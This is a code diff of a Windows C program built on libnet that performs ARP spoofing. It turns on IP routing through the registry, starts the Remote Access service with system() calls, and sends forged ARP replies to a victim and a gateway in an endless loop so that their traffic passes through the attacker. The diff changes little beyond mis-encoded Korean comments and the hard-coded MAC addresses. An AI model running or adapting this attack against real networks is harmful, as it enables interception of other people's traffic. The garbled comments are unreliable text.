@@ -7,7 +7,7 @@
 #pragma comment(lib, "libnet.lib")	 
 #pragma comment(lib, "ws2_32.lib")    
 
-struct ether_addr {                     // ÀÌ´õ³İ ÁÖ¼Ò ±¸Á¶Ã¼
+struct ether_addr {                     // ì´ë”ë„· ì£¼ì†Œ êµ¬ì¡°ì²´
 	unsigned char mac_add[6];
 };
 
@@ -18,14 +18,14 @@ int main() {
 	char *device = NULL;
 
 	uint8_t src_mac[6] = { 0xff,0xff,0xff,0xff,0xff,0xff };
-	uint8_t dst_mac[6] = { 0x00,0x0c,0x29,0x97,0xbc,0x04 };
-	uint8_t gate_mac[6] = { 0x00,0x50,0x56,0xe6,0x1f,0xc2 };
+	uint8_t dst_mac[6] = { 0xff,0xff,0xff,0xff,0xff,0xff };
+	uint8_t gate_mac[6] = { 0xff,0xff,0xff,0xff,0xff,0xff };
 	uint32_t src_ip, gate_ip, dst_ip;
 	struct libnet_ether_addr *smac;
 	libnet_t *l, *m;
 
 
-	// ·¹Áö½ºÆ®¸® Å° ºÒ·¯¿À±â
+	// ë ˆì§€ìŠ¤íŠ¸ë¦¬ í‚¤ ë¶ˆëŸ¬ì˜¤ê¸°
 	HKEY hKey;
 	DWORD dwValue = 1;
 	LONG lResult = RegOpenKeyEx(
@@ -40,7 +40,7 @@ int main() {
 		return 1;
 	}
 
-	//ºÒ·¯¿Â Å°ÀÇ °ª º¯°æÇÏ±â
+	//ë¶ˆëŸ¬ì˜¨ í‚¤ì˜ ê°’ ë³€ê²½í•˜ê¸°
 	lResult = RegSetValueEx(
 		hKey,
 		L"IPEnableRouter",
@@ -56,14 +56,14 @@ int main() {
 	}
 
 
-	//Routing and Remote Access ¼­ºñ½º ÀÚµ¿ ½ÃÀÛ È°¼ºÈ­
+	//Routing and Remote Access ì„œë¹„ìŠ¤ ìë™ ì‹œì‘ í™œì„±í™”
 	lResult = system("sc config RemoteAccess start=auto");
 	if (lResult != 0) {
 		printf("sc config failure\n");
 		return 1;
 	}
 
-	//Routing and Remote Access ¼­ºñ½º Áï½Ã ½ÃÀÛÇÏ±â(½ÃÀÛ ¾ÈµÇ¾îÀÖÀ»°æ¿ì)
+	//Routing and Remote Access ì„œë¹„ìŠ¤ ì¦‰ì‹œ ì‹œì‘í•˜ê¸°(ì‹œì‘ ì•ˆë˜ì–´ìˆì„ê²½ìš°)
 	lResult = system("sc query RemoteAccess | find \"RUNNING\" > nul");
 	if (lResult == 0) {
 		printf("sc Remote Access already Start\n");
@@ -92,7 +92,7 @@ int main() {
 	dst_ip = inet_addr(addr);
 	printf("\n");
 
-	// libnet ÃÊ±âÈ­
+	// libnet ì´ˆê¸°í™”
 	l = libnet_init(
 		LIBNET_LINK,			/* injection type */
 		device,                            	/* network interface */
@@ -121,9 +121,9 @@ int main() {
 	//Reply for gateway
 	libnet_autobuild_arp(
 		ARPOP_REPLY,
-		src_mac,				//°ø°İÀÚ MAC
-		(uint8_t *)&dst_ip,		// ÇÇÇØÀÚ IP 
-		gate_mac,			          // ¸ñÀûÁö gateway			
+		src_mac,				//ê³µê²©ì MAC
+		(uint8_t *)&dst_ip,		// í”¼í•´ì IP 
+		gate_mac,			          // ëª©ì ì§€ gateway			
 		(uint8_t *)&gate_ip,
 		l);
 	libnet_autobuild_ethernet(
@@ -134,9 +134,9 @@ int main() {
 	//Reply for victim
 	libnet_autobuild_arp(
 		ARPOP_REPLY,
-		src_mac,				// °ø°İÀÚ MAC
+		src_mac,				// ê³µê²©ì MAC
 		(uint8_t *)&gate_ip,		// gateway IP
-		dst_mac,				// ¸ñÀûÁö ÇÇÇØÀÚ
+		dst_mac,				// ëª©ì ì§€ í”¼í•´ì
 		(uint8_t *)&dst_ip,
 		m);
 
@@ -146,7 +146,7 @@ int main() {
 		m);
 
 
-	// ARP Reply ¹İº¹
+	// ARP Reply ë°˜ë³µ
 	while (1) {
 		printf("---------------------------------------------");
 		if ((libnet_write(l) == -1) || (libnet_write(m) == -1)) {
